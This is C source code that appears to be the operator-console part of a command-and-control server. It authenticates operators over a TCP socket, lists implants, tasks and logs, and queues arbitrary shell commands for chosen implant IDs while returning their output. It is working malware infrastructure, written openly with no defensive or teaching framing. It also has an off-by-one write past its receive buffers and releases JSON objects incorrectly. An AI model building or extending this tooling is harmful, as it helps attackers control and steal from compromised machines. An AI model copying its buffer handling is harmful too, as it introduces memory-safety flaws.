#include "operator.h"

#include <pthread.h>
#include <cjson/cJSON.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>

#include "db.h"

int autheticate(int sock) {
    char auth[1024];
    int bytes_received = recv(sock, auth, sizeof(auth), 0);
    if (bytes_received <= 0) {
        perror("recv failed");
        return -1;
    }
    auth[bytes_received] = '\0'; 
    cJSON *creds = cJSON_Parse(auth);

    if (creds == NULL) {
        fprintf(stderr, "Failed to parse JSON: %s\n", auth);
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *username = cJSON_GetObjectItem(creds, "username");
    

    if (username == NULL || !cJSON_IsString(username)) {
        fprintf(stderr, "Missing or invalid 'Username' field in JSON\n");
        cJSON_Delete(creds);
        return -1;
    }
    cJSON *password = cJSON_GetObjectItem(creds, "password");
    if (password == NULL || !cJSON_IsString(password)) {
        fprintf(stderr, "Missing or invalid 'Password' field in JSON\n");
        cJSON_Delete(creds);
        return -1;
    }

    cJSON *reply = cJSON_CreateObject();
    if (reply == NULL) {
        fprintf(stderr, "Failed to create cJSON object\n");
        cJSON_Delete(creds);
        // Handle error or exit
        return -1;
    }

    if (authenticate_operator(username->valuestring, password->valuestring) != 0) {
        cJSON_AddStringToObject(reply, "authenticated", "false");
        char *reply_ = cJSON_Print(reply);
        send(sock, reply_, strlen(reply_), 0);
        free(reply_);
        free(reply);
        cJSON_Delete(creds);
        return -1;
        
    }
    cJSON_AddStringToObject(reply, "authenticated", "true");
    char *reply_ = cJSON_Print(reply);
    send(sock, reply_, strlen(reply_), 0);
    free(reply_);
    free(reply);

    cJSON_Delete(creds);
    return 0;
}


char *interact_with_implant(cJSON *rinfo) {
    if (!rinfo) {
        return strdup("{\"error\": \"Invalid JSON\"}");
    }

    cJSON *implant_id = cJSON_GetObjectItem(rinfo, "implant_id");
    cJSON *action = cJSON_GetObjectItem(rinfo, "action");

    if (!action || !cJSON_IsString(action) || !implant_id || !cJSON_IsString(implant_id)) {
        return strdup("{\"error\": \"Missing or invalid action/implant_id\"}");
    }

    const char *action_value = action->valuestring;
    const char *implant_id_value = implant_id->valuestring;

    char *data = malloc(MAX_INFO);
    if (!data) return strdup("{\"error\": \"Memory allocation failed\"}");

    if (strcmp(action_value, "list-tasks") == 0) {
        snprintf(data, MAX_INFO, "%s", tasks_per_agent(implant_id_value));
    } 
    else if (strcmp(action_value, "response-task") == 0) {
        cJSON *task = cJSON_GetObjectItem(rinfo, "task_id");
        if (!task || !cJSON_IsNumber(task)) {
            free(data);
            return strdup("{\"error\": \"Invalid task_id\"}");
        }
        char *data_t = cmd_and_response(task->valueint);
        snprintf(data, MAX_INFO, "%s", data_t);
        free(data_t);
    } 
    else if (strcmp(action_value, "new-task") == 0) {
        cJSON *command = cJSON_GetObjectItem(rinfo, "command");
        if (!command || !cJSON_IsString(command)) {
            free(data);
            return strdup("{\"error\": \"Invalid command\"}");
        }
        new_tasks(implant_id_value, command->valuestring);
        free(data);
        cJSON *tasks_added = cJSON_CreateObject();
        cJSON_AddStringToObject(tasks_added, "status", "task_added");
        data = cJSON_Print(tasks_added);
        cJSON_Delete(tasks_added);
    } 
    else {
        free(data);
        return strdup("{\"error\": \"Invalid action\"}");
    }

    return data;
}


void *operator_handler(void *new_sock) {
    int sock = *(int*)new_sock;
    
    // 3 tries
    int try = 1;
    do {
        if (autheticate(sock) == 0) {
            goto START;
        } 
        try++;
    } while (try <= 3);
    return NULL;
    // operator requesting infomartion or add new tasks
    START:
    while (1) {
        char buffer[1024];
        memset(buffer, 0, sizeof(buffer));
        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) {
            perror("recv failed");
            return NULL;
        }

        buffer[bytes_received] = '\0'; 
        cJSON *requested_info = cJSON_Parse(buffer);
        if (requested_info == NULL) {
            fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
            return NULL;
        }

        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
        if (about == NULL || !cJSON_IsString(about)) {
            fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
            cJSON_Delete(requested_info);
            return NULL;
        }

        if (strcmp(about->valuestring, "Implants") == 0){ // all info about implants
            char *agents = GetData("Implants");
            send(sock, agents, strlen(agents), 0);
            free(agents);
        } else if (strcmp(about->valuestring, "Tasks") == 0) {
            char *tasks = GetData("Tasks");
            send(sock, tasks, strlen(tasks), 0);
            free(tasks);
        } else if (strcmp(about->valuestring, "Logs") == 0) {
            char *logs = GetData("Logs");
            send(sock, logs, strlen(logs), 0);
            free(logs);
        } else if (strcmp(about->valuestring, "implant_id") == 0) {
            char *data = interact_with_implant(requested_info);
            if (data == NULL) {
                send(sock, "ERROR", strlen("ERROR"), 0);
                continue;
            }
            send(sock, data, strlen(data), 0);
            free(data);
        }
        cJSON_Delete(requested_info);
    }
    
    close(sock);
    free(new_sock);
    return NULL;
}


void *Operator_conn(void* port) {
    int OPERATOR_PORT = *(int*)port;
    struct sockaddr_in clientAddr;
    socklen_t client_len = sizeof(clientAddr);
    int serverSock;

    serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock == -1) {
        perror("Socket creation failed for operator console");
        sleep(60);
        return NULL;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(OPERATOR_PORT);
    serverAddr.sin_family = AF_INET;

    if (bind(serverSock, (struct sockaddr*)&serverAddr, sizeof(serverAddr))) {
        perror("binding failed For operator console\n");
        close(serverSock);
        sleep(60);
        return NULL;
    }

    if (listen(serverSock, SOMAXCONN) == -1) {
        perror("Listen Failed for operator console\n");
        close(serverSock);
        sleep(60);
        return NULL;
    }
    
    while (1) {
        int sock;
        if ((sock = accept(serverSock, (struct sockaddr*)&clientAddr, (socklen_t*)&client_len)) < 0) {
            perror("Accept failed");
            continue;
        }
        
        // port = ntohs(clientAddr.sin_port) 
        // ip = inet_ntoa(client_addr.sin_addr)

        pthread_t thread;
        int *new_sock = malloc(sizeof(int));
        *new_sock = sock;
        if (pthread_create(&thread, NULL, operator_handler, (void*)new_sock) < 0) {
            perror("could not create thread");
            free(new_sock);
            continue;
        }
        // Detach thread so resources are automatically freed on exit
        pthread_detach(thread);
    }

    close(serverSock);
    return NULL;

}